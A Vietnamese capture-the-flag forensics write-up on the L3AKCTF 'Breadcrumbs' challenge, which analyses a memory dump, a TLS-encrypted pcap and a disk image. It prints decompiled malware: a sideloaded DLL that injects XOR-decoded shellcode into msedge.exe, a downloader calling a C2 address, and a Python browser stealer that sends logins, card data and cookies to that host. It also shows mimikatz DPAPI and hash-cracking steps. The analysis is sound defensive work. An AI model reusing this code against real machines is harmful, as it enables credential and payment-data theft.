---
title: "[L3AKCTF] Breadcrumbs"
description: "An employee's workstation began acting suspiciously; strange files appeared, and system performance dropped. Can you investigate what happened?"
author: ngname
date: 2025-07-14 16:18 +0700
categories: [CTF, Forensics]
tags: [windows, memory forensics, network forensics, disk forensics, malware, mimikatz]
img_path: /assets/img/L3AKCTF-Breadcrumbs
image: L3ak_CTF_2025_Logo.png
pin: true
---

## Link tải

https://drive.google.com/file/d/1Y12mpv1OhHsS_skVoDomRkDvR0KWSfnJ/view

https://drive.google.com/file/d/1CwHq6AYXNmojx0H1-UzGKbDRJCZaGxiY/edit

**Bài cho ta 3 file và phân làm 3 giai đoạn (3 flag) file dmp, pcap và cuối cùng là ad1**

Bài này do chưa phân tích kỹ nội dung của protocol TLS trong pcap nên không biết rằng phương thức mã hoá mà client-server sử dụng không an toàn => Bị kẹt và không giải được bài

## Giai đoạn 1: Memdump forensics

Khi chạy plugins `filescan` của volatility 3 thì thấy được điều khá là lạ là file `7za.exe` và `cryptbase.dll` trong thư mục `Desktop/7za`, `cryptbase.dll` là một **Windows System DLL** và vị trí mặc định nằm trong `C:\Windows\System32` vậy vị trí này khá bất thường cho nên ta sẽ dump về để kiểm tra

Sau khi dump về và đưa lên [virustotal](https://www.virustotal.com/gui/file/c44d05b46f4beabaa747f1c55e065bc96595768a715cfd67e87d9332dc27e87c) thì khá chắc chắn rằng đây là một file dll độc hại rồi, khả năng cao nó đã sử dụng kỹ thuật **dll sideloading** do `7za.exe - một phần mềm bình thường` không gọi toàn bộ đường dẫn `C:\Windows\System32\cryptbase.dll` khi load dll

Đưa vào IDA xem phần export thì không có gì bất thường, đều là những hàm mà `cryptbase.dll` thường export nhưng khi kiểm tra phần import có một số hàm khá đang ngờ thường dùng trong các kỹ thuật injection như là `VirtualAllocEx`, `CreateRemoteThread`, `WriteProcessMemory` và chúng đều có rossreference đến hàm `sub_7FFED6511000` trong khi kiểm tra

```c
int sub_7FFED6511000()
{
  HRSRC ResourceW; // rax
  HRSRC v1; // rdi
  DWORD v2; // ebx
  HGLOBAL Resource; // rax
  HRSRC v4; // rbp
  SIZE_T v5; // rsi
  HRSRC v6; // rdi
  DWORD v7; // edx
  HRSRC v8; // rcx
  __int64 v9; // rax
  DWORD (__stdcall *v10)(LPVOID); // rbx
  HRSRC v11; // rbx
  HMODULE phModule; // [rsp+50h] [rbp-B8h] BYREF
  struct _PROCESS_INFORMATION ProcessInformation; // [rsp+58h] [rbp-B0h] BYREF
  DWORD ExitCode; // [rsp+70h] [rbp-98h] BYREF
  SIZE_T NumberOfBytesWritten; // [rsp+78h] [rbp-90h] BYREF
  struct _STARTUPINFOW lpStartupInfo; // [rsp+80h] [rbp-88h] BYREF

  lpStartupInfo.cb = 104;
  memset(&lpStartupInfo.lpReserved, 0, 96);
  LODWORD(ResourceW) = CreateProcessW(
                         L"C:\\Program Files (x86)\\Microsoft\\Edge\\Application\\msedge.exe",
                         0,
                         0,
                         0,
                         0,
                         4u,
                         0,
                         0,
                         &lpStartupInfo,
                         &ProcessInformation);
  if ( (_DWORD)ResourceW )
  {
    phModule = 0;
    LODWORD(ResourceW) = GetModuleHandleExW(4u, (LPCWSTR)sub_7FFED6511000, &phModule);
    if ( (_DWORD)ResourceW )
    {
      ResourceW = FindResourceW(phModule, (LPCWSTR)0x65, L"SHELL");
      v1 = ResourceW;
      if ( ResourceW )
      {
        v2 = SizeofResource(phModule, ResourceW);
        Resource = LoadResource(phModule, v1);
        ResourceW = (HRSRC)LockResource(Resource);
        v4 = ResourceW;
        if ( ResourceW )
        {
          if ( v2 )
          {
            v5 = v2;
            ResourceW = (HRSRC)VirtualAlloc(0, v2, 0x1000u, 0x40u);
            v6 = ResourceW;
            if ( ResourceW )
            {
              sub_7FFED651D400(ResourceW, v4, v2);
              v7 = 0;
              v8 = v6;
              do
              {
                v8 = (HRSRC)((char *)v8 + 1);
                v9 = v7++ & 0xF;
                *((_BYTE *)v8 - 1) ^= aX7qp9zlma2vtej[v9];
              }
              while ( v7 < v2 );
              ResourceW = (HRSRC)VirtualAllocEx(ProcessInformation.hProcess, 0, v2, 0x3000u, 0x40u);
              v10 = (DWORD (__stdcall *)(LPVOID))ResourceW;
              if ( ResourceW )
              {
                NumberOfBytesWritten = 0;
                LODWORD(ResourceW) = WriteProcessMemory(
                                       ProcessInformation.hProcess,
                                       ResourceW,
                                       v6,
                                       v5,
                                       &NumberOfBytesWritten);
                if ( (_DWORD)ResourceW )
                {
                  ResourceW = (HRSRC)CreateRemoteThread(ProcessInformation.hProcess, 0, 0, v10, 0, 0, 0);
                  v11 = ResourceW;
                  if ( ResourceW )
                  {
                    ExitCode = 0;
                    GetExitCodeThread(ResourceW, &ExitCode);
                    CloseHandle(v11);
                    CloseHandle(ProcessInformation.hThread);
                    CloseHandle(ProcessInformation.hProcess);
                    LODWORD(ResourceW) = VirtualFree(v6, 0, 0x8000u);
                  }
                }
              }
            }
          }
        }
      }
    }
  }
  return (int)ResourceW;
}
```

Nói chung là hàm này thực hiện inject một shellcode đã bị mã hoá là một resource có tên `SHELL` trong file dll vào chương trình `msedge.exe`, trước ghi tạo và ghi vào vùng nhớ của msedge thì hàm này sẽ thực xor với mảng `aX7qp9zlma2vtej - Đây là tên mảng thôi` có giá trị là `X7qP9zLmA2VtEjC0` để ra shellcode thực

Khá đơn giản, và vì `SHELL` đã được hardcode sẵn trong dll rồi cho nên ta có thể dùng một số tool như là `Resource Hacker` để xuất nó ra sau đó lên cyberchef hoặc tạo script để xor với `X7qP9zLmA2VtEjC0` sẽ ra payload tiếp theo

Khi load vào IDA thì lại không nhận dạng được file, nên tôi kiểm tra lại bằng strings, binwalk thì thấy rằng có một file PE ở trong đó nữa

```bash
$ file decrypted_SHELL.bin
decrypted_SHELL.bin: data

$ binwalk decrypted_SHELL.bin

DECIMAL       HEXADECIMAL     DESCRIPTION
--------------------------------------------------------------------------------
2856          0xB28           Microsoft executable, portable (PE)
13704         0x3588          XML document, version: "1.0"
```

Do dùng `binwalk -e` không được nên chuyển sang dùng `dd`

```sh
$ dd if=decrypted_SHELL.bin of=extracted_pe.exe bs=1 skip=2856 count=10848
10848+0 records in
10848+0 records out
10848 bytes (11 kB, 11 KiB) copied, 0.0753224 s, 144 kB/s

$ file extracted_pe.exe
extracted_pe.exe: PE32+ executable for MS Windows 6.00 (DLL), x86-64, 6 sections
```

Lại là một file dll nữa, cho vào IDA lại xem sao, xem export có một hàm tên là `RunME` 

```c
int RunME_0()
{
  __int64 v0; // rdi
  __int64 v1; // rdx
  CHAR *v2; // rcx
  CHAR v3; // al
  CHAR *v4; // rax
  __int64 v5; // rcx
  CHAR *v6; // rax
  __int64 v7; // rax
  CHAR *v8; // rcx
  __int64 v9; // rdx
  __int64 v10; // rax
  char *v11; // r9
  CHAR v12; // r8
  CHAR *v13; // rax
  __int64 v14; // rdx
  CHAR *v15; // rcx
  CHAR v16; // al
  CHAR *v17; // rax
  __int64 v18; // rcx
  CHAR *v19; // rax
  __int64 v20; // rax
  CHAR *v21; // rcx
  __int64 v22; // rdx
  __int64 v23; // rax
  char *v24; // r9
  CHAR v25; // r8
  CHAR *v26; // rax
  int result; // eax
  __int64 v28; // rdx
  CHAR *v29; // rcx
  CHAR v30; // al
  CHAR *v31; // rax
  __int64 v32; // rcx
  CHAR *v33; // rax
  __int64 v34; // rax
  CHAR *v35; // rcx
  __int64 v36; // rbx
  char *v37; // rdx
  CHAR v38; // al
  CHAR *v39; // rax
  CHAR v40[272]; // [rsp+30h] [rbp-458h] BYREF
  CHAR v41[272]; // [rsp+140h] [rbp-348h] BYREF
  CHAR pszPath[272]; // [rsp+250h] [rbp-238h] BYREF
  CHAR v43[272]; // [rsp+360h] [rbp-128h] BYREF

  v0 = 2147483646;
  if ( SHGetFolderPathA(0, 26, 0, 0, pszPath) >= 0 )
  {
    v1 = 260;
    v2 = v40;
    do
    {
      if ( v1 == -2147483386 )
        break;
      v3 = v2[pszPath - v40];
      if ( !v3 )
        break;
      *v2++ = v3;
      --v1;
    }
    while ( v1 );
    v4 = v2 - 1;
    if ( v1 )
      v4 = v2;
    v5 = 260;
    *v4 = 0;
    v6 = v40;
    do
    {
      if ( !*v6 )
        break;
      ++v6;
      --v5;
    }
    while ( v5 );
    v7 = 260 - v5;
    if ( v5 )
    {
      v8 = &v40[v7];
      v9 = 260 - v7;
      if ( v7 != 260 )
      {
        v10 = 2147483646;
        v11 = (char *)("\\encrypted.bin" - v8);
        do
        {
          if ( !v10 )
            break;
          v12 = v8[(_QWORD)v11];
          if ( !v12 )
            break;
          *v8 = v12;
          --v10;
          ++v8;
          --v9;
        }
        while ( v9 );
      }
      v13 = v8 - 1;
      if ( v9 )
        v13 = v8;
      *v13 = 0;
    }
    URLDownloadToFileA(0, "https://10.10.70.114/encrypted.bin", v40, 0, 0);
  }
  v14 = 260;
  v15 = v41;
  do
  {
    if ( v14 == -2147483386 )
      break;
    v16 = v15[pszPath - v41];
    if ( !v16 )
      break;
    *v15++ = v16;
    --v14;
  }
  while ( v14 );
  v17 = v15 - 1;
  if ( v14 )
    v17 = v15;
  v18 = 260;
  *v17 = 0;
  v19 = v41;
  do
  {
    if ( !*v19 )
      break;
    ++v19;
    --v18;
  }
  while ( v18 );
  v20 = 260 - v18;
  if ( v18 )
  {
    v21 = &v41[v20];
    v22 = 260 - v20;
    if ( v20 != 260 )
    {
      v23 = 2147483646;
      v24 = (char *)("\\2.txt" - v21);
      do
      {
        if ( !v23 )
          break;
        v25 = v21[(_QWORD)v24];
        if ( !v25 )
          break;
        *v21 = v25;
        --v23;
        ++v21;
        --v22;
      }
      while ( v22 );
    }
    v26 = v21 - 1;
    if ( v22 )
      v26 = v21;
    *v26 = 0;
  }
  URLDownloadToFileA(0, "https://10.10.70.114/2.txt", v41, 0, 0);
  URLDownloadToFileA(0, "https://10.10.70.114/L3AK{AV_evasion_is_easy", v41, 0, 0);
  result = SHGetFolderPathA(0, 7, 0, 0, v43);
  if ( result >= 0 )
  {
    v28 = 260;
    v29 = v40;
    do
    {
      if ( v28 == -2147483386 )
        break;
      v30 = v29[v43 - v40];
      if ( !v30 )
        break;
      *v29++ = v30;
      --v28;
    }
    while ( v28 );
    v31 = v29 - 1;
    if ( v28 )
      v31 = v29;
    v32 = 260;
    *v31 = 0;
    v33 = v40;
    do
    {
      if ( !*v33 )
        break;
      ++v33;
      --v32;
    }
    while ( v32 );
    v34 = 260 - v32;
    if ( v32 )
    {
      v35 = &v40[v34];
      v36 = 260 - v34;
      if ( 260 != v34 )
      {
        v37 = (char *)("\\sctask.exe" - v35);
        do
        {
          if ( !v0 )
            break;
          v38 = v35[(_QWORD)v37];
          if ( !v38 )
            break;
          *v35 = v38;
          --v0;
          ++v35;
          --v36;
        }
        while ( v36 );
      }
      v39 = v35 - 1;
      if ( v36 )
        v39 = v35;
      *v39 = 0;
    }
    return URLDownloadToFileA(0, "https://10.10.70.114/sctasks.exe", v40, 0, 0);
  }
  return result;
}
```

Hàm này tải những file sau (`encrypted.bin`, `2.txt` và `sctasks.exe`) từ IP `10.10.70.114` khá chắc chắn đây là một server C2, trong đây cũng có phần 1 của flag

`L3AK{AV_evasion_is_easy`

Sau đó lục lại trong memdump thì không thấy gì, đã tìm qua filescan, eventlog, tìm key khôi phục thư mục `Quarantine` nhưng cũng không thấy gì cả. Do các packet trong file pcap bị mã hoá TLSv1.2 cho nên khi tìm key TLS để decrypt traffic cũng không có trong mempdump (Bởi vì nó không có, mà phải tìm trong file pcap xdd). Thế là team stuck zzz

Sau giải mới biết rằng sau mỗi một phần của flag thì ta sẽ chuyển sang file(stage) tiếp theo

## Giai đoạn 2: Network forensics

Chỉ filter IP của server C2 cho tiện: `ip.addr == 10.10.70.114`

File pcap tải về đã được mã hoá bởi **TLSv1.2**. Khi kiểm tra quá trình bắt tay (handshake) giữa server và client, tại **frame 10 (Server Hello, Certificate)**, ta thấy traffic sử dụng **cipher suite `TLS_RSA_WITH_AES_256_GCM_SHA384`**. Đây là phương thức mã hoá sử dụng RSA để trao đổi key.

Trong RSA, nếu modulus(n) (thành phần chính của public key, với n=p×q) được sinh ra quá nhỏ hoặc không đủ mạnh (ví dụ sử dụng prime yếu hoặc reuse), thì có thể factor hoá nnn thành ppp và qqq. Từ đó, ta tính được **private key** để giải mã toàn bộ TLS traffic.. Vậy nên ta sẽ copy dữ liệu của `tls.handshake.certificate` vào 1 file để kiểm tra bằng `openssl x509`

```sh
$ openssl x509 -in tlscert -inform DER -text -noout -modulus
Certificate:
    Data:
        Version: 3 (0x2)
        Serial Number:
            76:a9:af:24:d7:1a:c3:aa:fd:d3:ca:b1:25:fd:0d:f2:90:6a:7e:76
        Signature Algorithm: sha256WithRSAEncryption
        Issuer: C=AU, ST=Some-State, O=Internet Widgits Pty Ltd
        Validity
            Not Before: Jun 15 01:09:12 2025 GMT
            Not After : Jun 15 01:09:12 2026 GMT
        Subject: C=AU, ST=Some-State, O=Internet Widgits Pty Ltd
        Subject Public Key Info:
            Public Key Algorithm: rsaEncryption
                Public-Key: (1323 bit)
                Modulus:
                    04:5e:86:65:4b:c0:a3:b7:ca:87:31:07:a3:36:f5:
                    27:d1:30:5f:6a:44:c8:0e:3d:54:ba:fe:d6:69:c4:
                    51:18:d5:c3:0c:89:c4:65:c0:cc:fb:06:0a:62:59:
                    22:b4:2f:9a:70:25:5f:6d:20:82:5e:3b:f8:4c:7c:
                    a2:9f:3f:5b:04:89:52:51:e7:0f:e8:76:a7:4c:1b:
                    35:83:bf:7f:3e:ae:cd:56:b4:d4:48:7c:66:b0:aa:
                    15:5b:b9:35:c0:a2:0d:92:5b:31:4d:07:9c:1e:91:
                    d5:77:53:46:c6:e4:b7:bf:0a:e1:1e:d9:3a:55:b3:
                    d2:6b:71:3e:25:b1:d3:16:66:0b:98:9c:df:93:5b:
                    e6:7f:ff:82:bc:89:00:00:00:00:00:00:00:00:00:
                    00:00:00:00:00:00:00:00:00:00:00:00:00:01:32:
                    99
                Exponent: 65537 (0x10001)
        X509v3 extensions:
            X509v3 Subject Key Identifier:
                AE:05:E9:E8:18:02:30:35:FC:BD:2D:A8:B3:68:7E:F0:7E:3E:6D:50
            X509v3 Authority Key Identifier:
                AE:05:E9:E8:18:02:30:35:FC:BD:2D:A8:B3:68:7E:F0:7E:3E:6D:50
            X509v3 Basic Constraints: critical
                CA:TRUE
    Signature Algorithm: sha256WithRSAEncryption
    Signature Value:
        00:4b:05:2a:b4:ae:2b:7e:ad:67:70:29:7a:a7:91:e9:f9:45:
        47:fb:fd:c1:43:36:69:e9:33:7e:29:61:07:71:4d:14:d8:bb:
        25:8f:80:f6:6c:28:1b:6b:a8:dd:20:ab:bb:cd:89:ca:2e:76:
        8b:de:6d:28:72:e0:48:4b:d5:2b:76:ff:8f:90:60:45:24:31:
        e8:58:c4:17:ec:39:c5:f9:2a:cb:c2:f4:64:df:20:af:5f:42:
        f4:aa:78:52:55:76:aa:04:5a:b6:aa:f4:6c:dc:6e:6f:dd:3a:
        93:5b:8c:de:af:a0:ef:8f:89:8a:50:b6:78:b7:33:8e:07:6b:
        4f:dc:e1:69:09:9b:b9:b7:86:45:6e:5d:71:6a:86:53:d6:b6:
        f2:3b:c1:e5:65:c6:fb:45:df:b8:27:2b:df:d9:8f:27:80:b6:
        34:42:ed:ec
Modulus=45E86654BC0A3B7CA873107A336F527D1305F6A44C80E3D54BAFED669C45118D5C30C89C465C0CCFB060A625922B42F9A70255F6D20825E3BF84C7CA29F3F5B04895251E70FE876A74C1B3583BF7F3EAECD56B4D4487C66B0AA155BB935C0A20D925B314D079C1E91D5775346C6E4B7BF0AE11ED93A55B3D26B713E25B1D316660B989CDF935BE67FFF82BC8900000000000000000000000000000000000000000000013299
```

Để tìm được key thì ta cần tìm p và q `n = p x q`. Nếu đặt modulus(n) quá quá nhỏ, phổ biến thì nó có thể được chia ra từ đó tìm được key

Modulus khi ta dịch ra số nguyên là `100000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000006660000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000078489`

Đưa lên các trangn như factordb hoặc [alpertron](https://www.alpertron.com.ar/ECM.HTM) để tìm factor, ta có

```
p = 10000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000153

q = 10000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000513
```

Để tính key từ p và q ta có thể dùng [rsatool.py]()

```powershell
PS C:\Users\admin\Desktop\1> python -m rsatool -p 10000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000153 -q 10000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000513 -o key.pem
Using (p, q) to calculate RSA paramaters

n =
45e86654bc0a3b7ca873107a336f527d1305f6a44c80e3d54bafed669c45118d5c30c89c465c0ccf
b060a625922b42f9a70255f6d20825e3bf84c7ca29f3f5b04895251e70fe876a74c1b3583bf7f3ea
ecd56b4d4487c66b0aa155bb935c0a20d925b314d079c1e91d5775346c6e4b7bf0ae11ed93a55b3d
26b713e25b1d316660b989cdf935be67fff82bc89000000000000000000000000000000000000000
00000013299

e = 65537 (0x10001)

d =
2b7a31026bfc5528df3ec8b5a77d89a8de06ec711c5f60d30c027b3c40de37df59c1c15267f3e1c7
dd630e91f9494c9b25c22f22955799f0fdf09facdcd0ac3199c2a05641621b681afb49060c2dd696
79faf2ea7d6eaef1f4d39806ec6a4b676d3542d62b69e574ffdce15d721af483ef27acdda7a5f31d
8cdd0ef0cbd9ce6beb07adc7c302dcbf7cc0c0556f06d0f92f06d0f92f06d0f92f06d0f92f06d0f9
2f06d105001

p =
2171c159589d5d15bda1cb5599e1139240203175c53a03eb3db1352fea0ec1cc95f7013da153ba34
0fda630dc5390ac7b98241f3740bb945c51680000000000000000000000000000000000000000000
000099

q =
2171c159589d5d15bda1cb5599e1139240203175c53a03eb3db1352fea0ec1cc95f7013da153ba34
0fda630dc5390ac7b98241f3740bb945c51680000000000000000000000000000000000000000000
000201

Saving PEM as key.pem
```

Vậy là có key rồi, giờ ta chỉ cần quay trờ lại wireshark. Vào `Edit/Preferences/Protocols/TLS/RSA key lists` sau đó thêm key 

```
ip: 10.10.70.114
port: 443
protocol: tls
keyfile: <Đường dẫn đến key.pem vừa tạo>
password: Để trống
```

Sau khi apply và vào phần `Export Objects/HTML` sẽ thấy 3 file (`encrypted.bin`, `2.txt`, `sctask.exe`) mà dll độc hại đã tải về, xuất chúng ra để kiểm tra

Trong `2.txt` có flag phần 2

`_Mastering_forensics_`

Giờ ta sẽ tiếp tục phân tích 2 file còn lại, `encrypted.bin` thì như tên có lẽ đã bị mã hoá bởi `sctask.exe`, kiểm tra trong DiE thì biết rằng `sctask.exe` được viết bằng python nên ta sẽ sử dụng `pyinstxtractor.py` để chuyển về file .pyc sau đó dùng `pylingual` để decompile về code python lúc đầu

Đây là code đã decompile của `browser_stealer.py`

```py
# Decompiled with PyLingual (https://pylingual.io)
# Internal filename: browser_stealer.py
# Bytecode version: 3.13.0rc3 (3571)
# Source timestamp: 1970-01-01 00:00:00 UTC (0)

import base64
import json
import os
import shutil
import sqlite3
from datetime import datetime, timedelta
from Crypto.Cipher import AES
from win32crypt import CryptUnprotectData
appdata = os.getenv('LOCALAPPDATA')
roaming = os.getenv('APPDATA')
browsers = {'avast': appdata + '\\AVAST Software\\Browser\\User Data', 'amigo': appdata + '\\Amigo\\User Data', 'torch': appdata + '\\Torch\\User Data', 'kometa': appdata + '\\Kometa\\User Data', 'orbitum': appdata + '\\Orbitum\\User Data', 'cent-browser': appdata + '\\CentBrowser\\User Data', '7star': appdata + '\\7Star\\7Star\\User Data', 'sputnik': appdata + '\\Sputnik\\Sputnik\\User Data', 'vivaldi': appdata + '\\Vivaldi\\User Data', 'chromium': appdata + '\\Chromium\\User Data', 'chrome-canary': appdata + '\\Google\\Chrome SxS\\User Data', 'chrome': appdata + '\\Google\\Chrome\\User Data', 'epic-privacy-browser': appdata + '\\Epic Privacy Browser\\User Data', 'msedge-dev': appdata + '\\Microsoft\\Edge Dev\\User Data', '\\uCozMedia\\Uran\\User Data': appdata + '\\Yandex\\YandexBrowser\\User Data', '\\BraveSoftware\\Brave-Browser\\User Data': appdata + '\\Iridium\\User Data', '\\CocCoc\\Browser\\User Data': roaming + '\\Opera Software\\Opera Stable', '\\Opera Software\\Opera GX Stable': roaming + '\\Opera Software\\Opera GX Stable'}
data_queries = {'login_data': {'query': 'SELECT action_url, username_value, password_value FROM logins', 'file': '\\Login Data', 'columns': ['URL', 'Email', 'Password'], 'decrypt': True}, 'credit_cards': {'query': 'SELECT name_on_card, expiration_month, expiration_year, card_number_encrypted, date_modified FROM credit_cards', 'file': '\\Web Data', 'columns': ['Name On Card', 'Card Number', 'Expires On', 'Added On'], 'decrypt': True}, 'cookies': {'query': 'SELECT host_key, name, path, encrypted_value, expires_utc FROM cookies', 'file': '\\Network\\Cookies', 'columns': ['Host Key', 'Cookie Name', 'Path', 'Cookie', 'Expires On'], 'decrypt': True}, 'history': {'query': 'SELECT url, title, last_visit_time FROM urls', 'file': '\\History', 'columns': ['URL', 'Title', 'Visited Time'], 'decrypt': False}, 'downloads': {'query': 'SELECT tab_url, target_path FROM downloads'

def get_master_key(path: str):
    if not os.path.exists(path):
        pass  # postinserted
    return None

def decrypt_password(buff: bytes, key: bytes) -> str:
    iv = buff[3:15]
    payload = buff[15:(-16)]
    cipher = AES.new(key, AES.MODE_GCM, iv)
    decrypted_pass = cipher.decrypt(payload)
    decrypted_pass = decrypted_pass.decode()
    return decrypted_pass

def save_results(browser_name, type_of_data, content):
    if content:
        url = 'http://10.10.70.114:443'
        data = {'browser': browser_name, 'type': type_of_data, 'content': content}
        try:
            response = requests.post(url, json=data)
            if response.status_code == 200:
                print(f'\t [*] Data sent successfully for {browser_name}/{type_of_data}')
            return None
    else:  # inserted
        return None
    except Exception as e:
        print(f'\t [-] Error sending data: {e}')
        return None

def decrypt_my_data(encrypted_file):
    with open('encrypted.bin', 'rb') as f:
        content = f.read()
    iv = '1234567891011123'
    encrypted_data = '6b4781995cf5e4e02c2625b3d1ac6389dbaf68fb5649a3c24ede19465f470412'
    key = CryptUnprotectData(content, None, None, None, 0)[1]
    key = bytes.fromhex(key)
    cipher = AES.new(key, AES.MODE_CBC, iv)
    data = cipher.decrypt(encrypted_data)
    return decrypt_my_data

def get_data(path: str, profile: str, key, type_of_data):
    db_file = f"{path}\\{profile}{type_of_data['file']}"
    if not os.path.exists(db_file):
        pass  # postinserted
    return None

def convert_chrome_time(chrome_time):
    return (datetime(1601, 1, 1) + timedelta(microseconds=chrome_time)).strftime('%d/%m/%Y %H:%M:%S')

def installed_browsers():
    available = []
    for x in browsers.keys():
        if os.path.exists(browsers[x] + '\\Local State'):
            pass  # postinserted
        else:  # inserted
            available.append(x)
    return available
if __name__ == '__main__':
    available_browsers = installed_browsers()
    for browser in available_browsers:
        browser_path = browsers[browser]
        master_key = get_master_key(browser_path)
        print(f'Getting Stored Details from {browser}')
        for data_type_name, data_type in data_queries.items():
            print(f"\t [!] Getting {data_type_name.replace('_', ' ').capitalize()}")
            notdefault = ['opera-gx']
            profile = 'Default'
            profile = '' if browser in notdefault else ''
            data = get_data(browser_path, profile, master_key, data_type)
            save_results(browser, data_type_name, data)
            print('\t------\n')
```

Như tên, `sctask.exe` sẽ làm các điều sau

- Tìm các file database (`Login Data`, `Web Data`, `Cookies`, `History`, `Downloads`) trong thư mục user profile của browser
- Decrypt dữ liệu:
  - Sử dụng `win32crypt.CryptUnprotectData` để lấy master key (Windows DPAPI)
  - Dùng AES-GCM để decrypt password, credit card info, cookie value
  - Dùng AES-CBC để decrypt `encrypted_data`
- Gửi dữ liệu đã trích xuất về server C2:
  - Hardcoded IP: `10.10.70.114:443`
  - Gửi dạng JSON qua HTTP POST

Trong file pcap lại không có các request POST, có lẽ lúc đó không được capture nữa

> Việc phải tìm các file kia trong pcap cũng hơi lạ với không hợp lí lắm, do không có dấu hiệu các file này bị xoá idk, có thể người dùng đã tự xoá :) cho nên team dành cả giải phân tích memdump

## Gia đoạn 3: Disk forensics

Nhìn lại đoạn này trong `browser_stealer.py`

```py
def decrypt_my_data(encrypted_file):
    with open('encrypted.bin', 'rb') as f:
        content = f.read()
    iv = '1234567891011123'
    encrypted_data = '6b4781995cf5e4e02c2625b3d1ac6389dbaf68fb5649a3c24ede19465f470412'
    key = CryptUnprotectData(content, None, None, None, 0)[1]
    key = bytes.fromhex(key)
    cipher = AES.new(key, AES.MODE_CBC, iv)
    data = cipher.decrypt(encrypted_data)
    return decrypt_my_data
```

Mã hoá dùng `AES-CBC`

Qua phân tích hàm trên, biết rằng nội dung của `encrypted.bin` sẽ chứa key đã bị mã hoá bằng DPAPI masterkey bằng hàm `CryptUnprotectData()` . Vậy để giải mã `encrypted.bin` ta sẽ cần masterkey, ta sẽ dùng chức năng `dpapi::masterkey` của [mimikatz](https://github.com/ParrotSec/mimikatz)

### Masterkey 

Tìm kiếm trên google biết nó được lưu ở `%APPDATA%\Microsoft\Protect\{SID}`, SID là `Security Identifier` của người dùng và trong thư mục đó chính là masterkey bị mã hoá, ở đây là file `4dc3472c-8370-4831-9124-f45a6d742757` (File bị ẩn nên trong powershell dùng `ls -Force` để liệt kê tất cả sẽ thấy)

`SID: S-1-5-21-2532670039-4151104164-2696135040-1001`

**Để giải mã được masterkey mimikatz cần các điều kiện sau**

```
dpapi::masterkey /in:"" /sid: /password:

/in:"..." File masterkey

/sid:... → SID của người dùng

/password:... → Mật khẩu của người dùng
```

Để tìm password ta sẽ quay lại với file memdump và dùng plugin `hashdump` trong volatility3 để tìm hash của các người dùng trên máy, qua phân tích file .ad1 ta biết rằng ta cần phải tìm hash của người dùng `abdelrhman322`

```
Administrator   500     aad3b435b51404eeaad3b435b51404ee        31d6cfe0d16ae931b73c59d7e0c089c0
Guest   501     aad3b435b51404eeaad3b435b51404ee        31d6cfe0d16ae931b73c59d7e0c089c0
DefaultAccount  503     aad3b435b51404eeaad3b435b51404ee        31d6cfe0d16ae931b73c59d7e0c089c0
WDAGUtilityAccount      504     aad3b435b51404eeaad3b435b51404ee        3adba90fec32aa9d389feaf6be43a3f3
abdelrhman322   1001    aad3b435b51404eeaad3b435b51404ee        7ed4bd1015f33ad80eff4a63119ef2d9
```

Crack hash ở cột thứ 2 (NTLM hash) ta có mật khẩu của người dùng là **5563756**. Vậy là có đủ điều kiện để crack masterkey rồi

```powershell
dpapi::masterkey /in:"C:\Users\admin\Desktop\1\stage3\4dc3472c-8370-4831-9124-f45a6d742757" /sid:S-1-5-21-2532670039-4151104164-2696135040-1001 /password:5563756

..............
[masterkey] with password: 5563756 (normal user)
  key : e0485275a4cc2497878280660141afd34065a22a9eb01f347a26d37e4de3944227d0711262c8a1ee99a655232052a395cac97daa00e0acbf815ea86a3f5aedd2
  sha1: 06e25d82fd8c0eab4104b47e176c3b8398786f4a
```

Vậy masterkey là **e0485275a4cc2497878280660141afd34065a22a9eb01f347a26d37e4de3944227d0711262c8a1ee99a655232052a395cac97daa00e0acbf815ea86a3f5aedd2**. Dùng nó để giải mã `encrypted.bin`

```powershell
dpapi::blob /in:"C:\Users\admin\Desktop\1\stage3\encrypted.bin" /masterkey:e0485275a4cc2497878280660141afd34065a22a9eb01f347a26d37e4de3944227d0711262c8a1ee99a655232052a395cac97daa00e0acbf815ea86a3f5aedd2

..............
 * volatile cache: GUID:{4dc3472c-8370-4831-9124-f45a6d742757};KeyHash:06e25d82fd8c0eab4104b47e176c3b8398786f4a
 * masterkey     : e0485275a4cc2497878280660141afd34065a22a9eb01f347a26d37e4de3944227d0711262c8a1ee99a655232052a395cac97daa00e0acbf815ea86a3f5aedd2
description :
data: 6d 79 5f 73 75 70 65 72 5f 73 65 63 72 65 74 5f
```

Key(hex) là **6d795f73757065725f7365637265745f** và iv(UTF8) là **1234567891011123**

Vậy chỉ còn 1 dữ liệu chưa được giải mã thôi, biết được nó dùng `AES-CBC`

```py
encrypted_data = '6b4781995cf5e4e02c2625b3d1ac6389dbaf68fb5649a3c24ede19465f470412'
```

Lên [Cyberchef](https://gchq.github.io/CyberChef/#recipe=AES_Decrypt(%7B'option':'Hex','string':'6d795f73757065725f7365637265745f'%7D,%7B'option':'UTF8','string':'1234567891011123'%7D,'CBC','Hex','Raw',%7B'option':'Hex','string':''%7D,%7B'option':'Hex','string':''%7D)&input=NmI0NzgxOTk1Y2Y1ZTRlMDJjMjYyNWIzZDFhYzYzODlkYmFmNjhmYjU2NDlhM2MyNGVkZTE5NDY1ZjQ3MDQxMg) để giải mã

`is_where_the_challenge_begins}`

## Flag

`L3AK{AV_evasion_is_easy_Mastering_forensics_is_where_the_challenge_begins}`

